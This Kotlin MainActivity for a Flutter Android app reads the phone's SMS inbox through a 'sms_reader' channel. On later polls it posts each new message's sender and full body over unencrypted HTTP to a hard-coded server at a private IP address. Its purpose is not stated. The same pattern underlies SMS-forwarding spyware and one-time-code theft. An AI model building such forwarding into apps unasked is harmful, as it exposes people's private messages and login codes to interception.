package com.example.sou

import android.database.Cursor
import android.net.Uri
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : FlutterActivity() {

    private val CHANNEL = "sms_reader"

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL)
            .setMethodCallHandler { call, result ->

                if (call.method == "getSMS") {
                    try {
                        val lastTimestamp = call.argument<String>("lastId")?.toLongOrNull()
                        val isInitialLoad = lastTimestamp == null || lastTimestamp <= 0L
                        val now = System.currentTimeMillis()
                        val smsList = mutableListOf<Map<String, Any>>()
                        val seenIds = mutableSetOf<String>()

                        val uris = listOf(
                            "content://sms/inbox",
                            //"content://sms",
                        )

                        val selection: String
                        val selectionArgs: Array<String>

                        if (!isInitialLoad) {
                            selection = "date > ? AND date <= ?"
                            selectionArgs = arrayOf(lastTimestamp.toString(), now.toString())
                        } else {
                            // Init: last 24 hours — load for UI only, don't POST
                            selection = "date <= ? AND date >= ?"
                            val oneDayAgo = (now - 24 * 60 * 60 * 1000L).toString()
                            selectionArgs = arrayOf(now.toString(), oneDayAgo)
                        }

                        for (uriString in uris) {
                            try {
                                val uri = Uri.parse(uriString)
                                val cursor: Cursor? = contentResolver.query(
                                    uri,
                                    arrayOf("_id", "address", "body", "date", "type"),
                                    selection,
                                    selectionArgs,
                                    "date DESC"
                                )

                                var uriCount = 0

                                cursor?.use {
                                    val idIndex      = it.getColumnIndex("_id")
                                    val addressIndex = it.getColumnIndex("address")
                                    val bodyIndex    = it.getColumnIndex("body")
                                    val dateIndex    = it.getColumnIndex("date")
                                    val typeIndex    = it.getColumnIndex("type")

                                    if (idIndex < 0 || dateIndex < 0) {
                                        android.util.Log.w("SMS_DEBUG", "$uriString → missing columns, skipping")
                                        return@use
                                    }

                                    while (it.moveToNext()) {
                                        val id = it.getString(idIndex) ?: continue
                                        if (seenIds.contains(id)) continue
                                        seenIds.add(id)
                                        uriCount++

                                        smsList.add(mapOf(
                                            "id"     to id,
                                            "sender" to (it.getString(addressIndex) ?: "Unknown"),
                                            "body"   to (it.getString(bodyIndex)    ?: ""),
                                            "date"   to (it.getString(dateIndex)    ?: "0"),
                                            "type"   to (it.getString(typeIndex)    ?: "0")
                                        ))
                                    }
                                }

                                android.util.Log.d("SMS_DEBUG", "$uriString → $uriCount new rows")

                            } catch (e: Exception) {
                                android.util.Log.e("SMS_DEBUG", "$uriString → error: ${e.message}")
                            }
                        }

                        android.util.Log.d("SMS_DEBUG", "Total returning: ${smsList.size}")

                        // ✅ Only POST on subsequent polls, not the initial 24h load
                        if (!isInitialLoad && smsList.isNotEmpty()) {
                            Thread {
                                smsList.forEach { sms -> postSmsToApi(sms) }
                            }.start()
                        }

                        result.success(smsList)

                    } catch (e: Exception) {
                        result.error("SMS_ERROR", e.message, null)
                    }
                } else {
                    result.notImplemented()
                }
            }
    }

    private fun postSmsToApi(sms: Map<String, Any>) {
        try {
            val payload = JSONObject()
            payload.put("id",          sms["id"])
            payload.put("sender",      sms["sender"])
            payload.put("body",        sms["body"])
            payload.put("date",        sms["date"])
            payload.put("type",        sms["type"])
            payload.put("device_time", System.currentTimeMillis())
            
            val url = URL("http://10.241.108.178:5000/user/get-new-message")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("Accept", "application/json")
            conn.doOutput = true
            conn.connectTimeout = 10_000
            conn.readTimeout = 10_000

            OutputStreamWriter(conn.outputStream, "UTF-8").use { writer ->
                writer.write(payload.toString())
                writer.flush()
            }

            android.util.Log.d("SMS_POST", "Posted id=${sms["id"]} sender=${sms["sender"]} → ${conn.responseCode}")
            conn.disconnect()

        } catch (e: Exception) {
            android.util.Log.e("SMS_POST", "POST failed: ${e.message}")
        }
    }
}